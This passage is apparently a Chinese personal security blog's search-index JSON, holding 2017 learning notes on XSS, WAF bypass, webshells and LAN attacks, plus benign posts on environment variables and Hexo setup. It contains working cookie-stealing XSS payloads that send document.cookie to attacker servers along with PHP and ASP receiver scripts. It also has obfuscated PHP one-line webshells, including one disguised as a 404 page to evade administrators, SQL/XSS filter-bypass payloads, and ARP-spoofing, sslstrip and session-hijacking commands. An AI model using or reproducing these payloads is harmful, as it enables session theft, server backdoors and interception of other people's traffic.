src=&quot;http://qaq.com/joke.js&quot;&gt;&lt;/script&gt;将先加载joke.js的脚本 1234var img = document.createElement('img');img.width = 0;img.height = 0;img.src = 'http://qaqcom/joke/joke.php?joke='+encodeURIComponent(document.cookie); 创建一个img标签，将它的src属性指向.预先写好的一个脚本joke.php 并且将页面的cookie最为参数附加到url后面 joke.php里解析请求里面的joke参数（即用户的cookie）然后保存 12345678910111213&lt;?php @ini_set('display_errors',1); $str = $_GET['joke']; $filePath = \"joke.php\"; if(is_writable($filePath)==false)&#123; echo \"can't write\"; &#125;else&#123; $handler = fopen(filePath, \"a\"); fwrite($handler, $str); fclose($handler); &#125;?&gt; Exp 21234567891011121314151617181920212223&lt;html&gt;&lt;title&gt;xx&lt;/title&gt;&lt;body&gt;&lt;%testfile = Server.MapPath(\"code.txt\") //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中msg = Request(\"msg\") //获取提交过来的msg变量，也就是cookie值set fs = server.CreateObject(\"scripting.filesystemobject\")//创建一个fs对象set thisfile = fs.OpenTextFile(testfile,8,True,0)thisfile.WriteLine(\"\"&amp;msg&amp;\"\")//像code.txt中写入获取来的cookiethisfile.close() //关闭set fs = nothing%&gt;&lt;/body&gt;&lt;/html&gt; 把上述文件保存为cookie.asp文件，放到自己的网站服务器下xss构造为&lt;script&gt;window.open(&#39;http://10.10.10.10/cookie.asp?msg=&#39;+document.cookie)&lt;/script&gt; 点击留言页面后进入后页面会跳转，此时cookie就发送到自己的服务器下的code.txt文件中了 DOM Based XSSDOM XSS 从效果上来说也是反射型DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，但是服务端对我们是不可见的 file:///C:/Users/Administrator/Desktop/1.html在1.html后面输入&lt;script&gt;document.write(document.URL.substring(document.URL.indexOf(&quot;a=&quot;+2,document.URL.length));&lt;/script&gt; Document.write是把里面的内容写到页面里 document.URL是获取URL地址 Substring 从某处到某处，把之间的内容获取 document.URL.indexOf(“a=”)+2是在当前URL里从开头检索a=字符，然后加2(因为a=是两个字符，我们需要把他略去)，同时他也是substring的开始值 document.URL.length是获取当前URL的长度，同时也是substring的结束值 合起来的意思就是：在URL获取a=后面的值，然后把a=后面的值给显示出来 将显示ile:///C:/Users/Administrator/Desktop/1.html因为当前url并没有a=的字符，而indexOf的特性是，当获取的值里，如果没有找到自己要检索的值的话，返回-1。找到了则返回0。那么document.URL.indexOf(&quot;a=&quot;)则为-1，再加上2，得1。然后一直到URL最后。这样一来，就把file的f字符给略去了，所以才会出现ile:///C:/Users/Administrator/Desktop/1.html（这点还不是很懂） 在a=后面输入123将显示123 输入&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;成功弹窗 dom xss 的脚本代码虽然也在url中 但是与反射型不同的是 代码在 #(hash)后面并且直接查看源码看不到","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"},{"name":"javascript","slug":"javascript","permalink":"http://Merl1ng.com/tags/javascript/"},{"name":"html","slug":"html","permalink":"http://Merl1ng.com/tags/html/"}]},{"title":"bypass_waf","slug":"bypass_waf","date":"2017-07-20T13:44:22.000Z","updated":"2017-07-26T05:08:52.631Z","comments":true,"path":"2017/07/20/bypass_waf/","link":"","permalink":"http://Merl1ng.com/2017/07/20/bypass_waf/","excerpt":"一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来","text":"一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;利用 在hackbar Post data写入xx=assert￥oo=QAQ 姿势二 无Postgetallheaders函数能够获取请求头内容&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;结合姿势一&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt; 姿势三 遇到会检测http请求头内容的waf&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;解开之后发现是乱码，waf识别不出来里面的内容结合姿势一&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt; 姿势四 防止管理员删shell&gt;伪装成404 1234567891011121314151617&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; ... &lt;?php$xx=getallheaders()['xx'];$oo=getallheaders()['oo'];if($xx!=\"\" and $oo!=\"\")&#123; $xx=gzuncompress(base64_decode($xx));$xx(gzuncompress(base64_decode($oo)));&#125;&gt;&lt;/body&gt;&lt;/html&gt; SQL XSS bypass waf姿势一 大小写转换SQL：sEleCt vERsIoN()XSS：&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt; 姿势二 字符编码SQL：load_file(0x633A2F77696E646F77732F6D792E696E69)XSS：&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt; 姿势三 拼凑法 其只验证一次SQL：selselectect verversionsion();XSS：&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt; 姿势四 干扰字符污染法：空字符 空格 TAB换行 注释 特殊的函数等等都可以SQL：sEleCt+1-1+vERsIoN /*!*/ ();","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"waf","slug":"waf","permalink":"http://Merl1ng.com/tags/waf/"},{"name":"xss","slug":"xss","permalink":"http://Merl1ng.com/tags/xss/"},{"name":"sql","slug":"sql","permalink":"http://Merl1ng.com/tags/sql/"}]},{"title":"一句话木马和中国菜刀","slug":"一句话木马和中国菜刀","date":"2017-07-18T14:11:31.000Z","updated":"2017-08-10T15:43:49.518Z","comments":true,"path":"2017/07/18/一句话木马和中国菜刀/","link":"","permalink":"http://Merl1ng.com/2017/07/18/一句话木马和中国菜刀/","excerpt":"看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下","text":"看hbctf的一道题学习了一点，先记录下来。首先需要可以上传（写入）文件 写入php文件或asp文件均可。以php为例，新建文件后写下&lt;?php @eval($_POST[&#39;QAQ&#39;]);?&gt; (@符号的意思是不报错)顺便asp为&lt;%eval request(&quot;QAQ&quot;)%&gt; “QAQ”相当于一个标记。eval是一个php函数他将符合php语法的字符当做php代码进行执行即一个后门 （怎么用hackbar的Post data写入文件还不会…以后回来改） 连接菜刀 输入网站 和当时标记即可拿shell查看文件（flag）等等","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[{"name":"webshell","slug":"webshell","permalink":"http://Merl1ng.com/tags/webshell/"}]},{"title":"lan attack","slug":"lan attack","date":"2017-05-30T15:13:26.000Z","updated":"2017-07-25T06:13:17.443Z","comments":true,"path":"2017/05/30/lan attack/","link":"","permalink":"http://Merl1ng.com/2017/05/30/lan attack/","excerpt":"内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig","text":"内网视频学习笔记(￣▽￣)~* 局域网断网攻击虚拟机 kali linuxarpspoof -i 网卡 -t ip 网关查别人的 ip fping-asg x.0/24linux ifconfig windows ipcomfig arp 欺骗先输入 ech0 1&gt;/proc/sys/net/ipv4/ip_forward 无回显可用cat 看是否成功 cat/proc/sys/net/ipv4/ip_forward再arpspoof … driffnet 获取本机网卡图片driffnet -i 网卡会弹一个小窗口可在/tmp内找到图片 httpettercap dns欺骗 流量嗅探先arp欺骗 再 ettercap-Tq-i eth0(Tq 启动文本模式 q安静模式) httpssslstrip 将https链接还原为http （缺点：证书错误）首先设置 使用 vim esc+:q!不保存退出 esc+:wq保存退出vim/etc/ettercap/etter.conf光标移动到 linux 删除下两个# 设置完成sslstrip -a -f -k 会话劫持way1 先arp欺骗wireshark 抓包 ferret重新生成抓包后文件 hamster重放流量输入wireshark 为图形界面抓包并保存为QAQ.pacp文件再ferret -r QAQ.pacp生成txt文件 将该文件复制到cp hamster.txt /root/输入 hamster 根据提示修改浏览器代理设置进入网址 way2ferret -i eth0(网卡)浏览器设置同上再hamster （若有hamster文件存在需先删除）进入网址同步获取 way3cookie cadger工具一键劫持","categories":[{"name":"lan","slug":"lan","permalink":"http://Merl1ng.com/categories/lan/"}],"tags":[]},{"title":"环境变量和误删后的修复","slug":"环境变量和误删后的修复","date":"2017-04-30T15:10:52.000Z","updated":"2017-12-29T10:18:56.127Z","comments":true,"path":"2017/04/30/环境变量和误删后的修复/","link":"","permalink":"http://Merl1ng.com/2017/04/30/环境变量和误删后的修复/","excerpt":"在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径","text":"在windows上配置cmder和binwalk时遇到查看高级系统设置环境变量 系统变量选择Path后新建路径 后面发现其实很多地方都需要配置环境变量 这可以让对工具的使用更加方便不用再到每个工具的文件上 或者逐一cd 使用命令行而是可以在任何地方直接输入命令调用 有次在增加环境变量是 点完确定 杀软提示给不给过 手贱点了 否 结果狗日的杀软把我的环境变量都给删了 orz.. 导致一进系统设置有关的地方全部弹窗 %windir% \\system32\\systempropertiescomputername.exe 先回去环境变量设置那里都不行 查了一下可以利用注册表增加环境变量 又试了试结果注册表也打不开 .. 当时差点重装了 好在最后找到了方法 win10在开机的欢迎页面摁住shift再点击重启 (可能要两回) 会看到提示页面 点击疑难解决 高级 重启 重启后 F4 进入安全模式 试了试cmd set 环境变量还是不行 无意间找到了 C:\\Windows\\System32 下的 SystemPropertiesAdvanced 文件 打开 成功添加 path 的数据可以在杀软的拦截日志里找回","categories":[{"name":"setting","slug":"setting","permalink":"http://Merl1ng.com/categories/setting/"}],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2017-04-12T15:50:25.000Z","updated":"2017-07-25T06:15:29.963Z","comments":true,"path":"2017/04/12/hello-world/","link":"","permalink":"http://Merl1ng.com/2017/04/12/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}